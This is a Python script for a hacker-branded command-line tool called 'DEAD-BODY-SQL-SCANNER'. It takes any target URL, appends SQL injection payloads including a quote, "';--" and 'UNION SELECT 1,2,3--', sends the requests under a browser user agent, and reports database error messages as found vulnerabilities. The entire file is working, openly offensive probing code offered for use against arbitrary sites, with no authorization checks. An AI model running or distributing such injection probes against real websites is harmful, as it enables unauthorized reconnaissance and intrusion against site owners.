import requests
import os
import time
import sys

# Colors
G = '\033[1;32m'
R = '\033[1;31m'
B = '\033[1;34m'
Y = '\033[1;33m'
W = '\033[0m'
BOLD = '\033[1m'

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner(mode):
    clear()
    print(f"{R}{BOLD}")
    print("  ██████╗ ███████╗ █████╗ ██████╗     ██████╗  ██████╗ ██████╗ ██╗   ██╗")
    print("  ██╔══██╗██╔════╝██╔══██╗██╔══██╗    ██╔══██╗██╔═══██╗██╔══██╗╚██╗ ██╔╝")
    print("  ██║  ██║█████╗  ███████║██║  ██║    ██████╔╝██║   ██║██║  ██║ ╚████╔╝ ")
    print("  ██║  ██║██╔══╝  ██╔══██║██║  ██║    ██╔══██╗██║   ██║██║  ██║  ╚██╔╝  ")
    print("  ██████╔╝███████╗██║  ██║██████╔╝    ██████╔╝╚██████╔╝██████╔╝   ██║   ")
    print("  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝     ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝   ")
    print(f"{G}{'='*67}")
    print(f"  TOOL: DEAD-BODY-SQL-SCANNER")
    print(f"  CREATED BY: NZ NISHAN")
    print(f"{G}{'='*67}{W}")
    print(f"  {Y}>> MODE: {mode}{W}\n")

def run_scanner():
    target = input(f"{Y}[?] ENTER TARGET URL: {W}")
    headers = {'User-Agent': 'Mozilla/5.0'}
    payloads = ["'", '"', "';--", "UNION SELECT 1,2,3--"]

    print(f"{B}[*] SCANNING STARTED...{W}")
    found = False
    for p in payloads:
        print(f"{Y}[>] Testing: {p}{W}")
        try:
            res = requests.get(target + p, headers=headers, timeout=5)
            if any(err in res.text.lower() for err in ["sql syntax", "mysql", "postgresql"]):
                print(f"{G}[!!!] VULNERABILITY FOUND WITH PAYLOAD: {p}{W}")
                found = True
                break
        except: continue
    if not found:
        print(f"{R}[-] TARGET SECURE.{W}")
    input(f"\n{B}Press [ENTER] to return...{W}")

def main():
    while True:
        show_banner("MAIN TERMINAL")
        print(f"{R}  [01] START SCAN")
        print(f"{R}  [02] ABOUT")
        print(f"{R}  [03] EXIT{W}")
        choice = input(f"\n{Y}DEAD-BODY@TERMINAL:~# {W}")
        if choice == '1': run_scanner()
        elif choice == '2':
            print(f"\n{G}  TOOL NAME : DEAD-BODY-SQL-SCANNER")
            print(f"  DEVELOPED BY: NZ NISHAN")
            print(f"  INSTAGRAM : @boycott_nishan{W}")
            input("\nPress [ENTER] to return...")
        elif choice == '3': sys.exit()

if __name__ == "__main__":
    main()